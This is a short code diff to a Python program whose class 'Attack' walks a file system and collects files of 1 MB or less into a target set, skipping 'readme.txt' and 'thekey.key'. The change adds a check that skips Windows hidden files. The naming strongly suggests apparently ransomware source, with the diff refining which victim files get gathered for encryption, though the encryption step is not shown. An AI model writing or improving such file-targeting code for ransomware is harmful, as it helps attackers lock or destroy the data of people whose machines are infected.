@@ -1,5 +1,6 @@
 import json
 import os
+import stat
 import logging
 import customtkinter as ctk
 
@@ -42,7 +43,8 @@ class Attack:
                 if os.path.isdir(path):
                     self.list_files(path)
                 elif os.path.isfile(path):
-                    if file not in ["readme.txt", "thekey.key", "desktop.ini", "thumbs.db"]:
+                    # Checking if file in any in the list or is hidden, pass if condition is true else add file to set
+                    if file not in ["readme.txt", "thekey.key"] and not os.stat(path).st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN:
                         if os.path.getsize(path) <= 1048576:
                             self.files.add(path)
                 
